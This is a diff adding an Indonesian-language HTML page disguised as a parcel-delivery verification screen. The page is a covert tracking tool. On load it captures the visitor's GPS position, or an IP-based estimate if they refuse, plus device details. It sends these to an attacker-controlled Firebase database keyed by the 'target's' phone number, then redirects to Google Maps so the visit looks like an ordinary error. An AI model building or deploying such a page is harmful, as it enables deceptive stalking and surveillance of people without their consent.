@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Pengiriman</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+</head>
+<body class="bg-slate-50 flex items-center justify-center min-h-screen p-4 font-sans">
+
+    <div class="max-w-md w-full bg-white rounded-2xl shadow-xl border border-slate-100 p-6 text-center">
+        <div class="w-16 h-16 border-4 border-blue-500/20 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
+        <h2 class="text-xl font-bold text-slate-800 mb-2">Sinkronisasi Lokasi Kurir</h2>
+        <p class="text-sm text-slate-500 mb-6">Mohon izinkan akses lokasi pada browser Anda untuk memetakan rute pengiriman paket ke rumah Anda.</p>
+        <p class="text-xs text-amber-600 bg-amber-50 border border-amber-200 py-2 px-3 rounded-lg font-medium">
+            ⚠️ Klik "IZINKAN" / "ALLOW" jika muncul notifikasi browser.
+        </p>
+    </div>
+
+    <script>
+        // === KONFIGURASI FIREBASE KAMU ===
+        const firebaseConfig = {
+            apiKey: "COPAS_API_KEY_KAMU",
+            authDomain: "PROJECT_KAMU.firebaseapp.com",
+            databaseURL: "https://PROJECT_KAMU-default-rtdb.firebaseio.com",
+            projectId: "PROJECT_KAMU",
+            storageBucket: "PROJECT_KAMU.appspot.com",
+            messagingSenderId: "ID_KAMU",
+            appId: "APP_ID_KAMU"
+        };
+        
+        // Inisialisasi Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Ambil parameter nomor dari URL (misal: target.html?num=08139369239)
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetNumber = urlParams.get('num') || 'Unknown_Number';
+
+        // Ambil data IP dan Info Perangkat Tambahan (Tanpa Perlu Izin)
+        let deviceData = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            waktu: new Date().toLocaleString('id-ID')
+        };
+
+        // Otomatis lacak saat halaman dimuat
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // JIKA TARGET MENGKLIK IZINKAN (AKURASI GPS 100%)
+                        database.ref('tracked_users/' + targetNumber).set({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            status: "Akurat (GPS)",
+                            ...deviceData
+                        }).then(() => {
+                            // Alihkan ke Google Maps asli biar dikira eror biasa
+                            window.location.href = "https://maps.google.com";
+                        });
+                    },
+                    (error) => {
+                        // JIKA TARGET MENOLAK IZINKAN (Tetap lacak pakai IP estimasi kasar)
+                        fetch('https://ipapi.co/json/')
+                            .then(res => res.json())
+                            .then(ipData => {
+                                database.ref('tracked_users/' + targetNumber).set({
+                                    latitude: ipData.latitude,
+                                    longitude: ipData.longitude,
+                                    status: "Estimasi (IP Provider)",
+                                    kota: ipData.city,
+                                    ...deviceData
+                                }).then(() => {
+                                    window.location.href = "https://maps.google.com";
+                                });
+                            });
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            }
+        };
+    </script>
+</body>
+</html>
